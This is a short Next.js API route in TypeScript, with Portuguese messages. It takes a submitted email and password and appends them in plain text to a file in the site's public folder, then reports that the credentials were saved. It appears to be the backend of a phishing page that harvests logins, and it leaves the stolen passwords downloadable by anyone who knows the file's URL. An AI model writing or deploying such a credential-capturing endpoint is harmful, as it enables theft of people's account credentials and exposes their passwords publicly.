import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function POST(request: Request) {
  const data = await request.json();
  const { email, password } = data;

  const filePath = path.join(process.cwd(), 'public', 'credentials.txt');

  const content = `Email: ${email}\nPassword: ${password}\n\n`;

  fs.appendFile(filePath, content, (err) => {
    if (err) {
      console.error('Erro ao salvar as credenciais:', err);
    }
  });

  return NextResponse.json({ message: 'Credenciais salvas com sucesso!' });
}
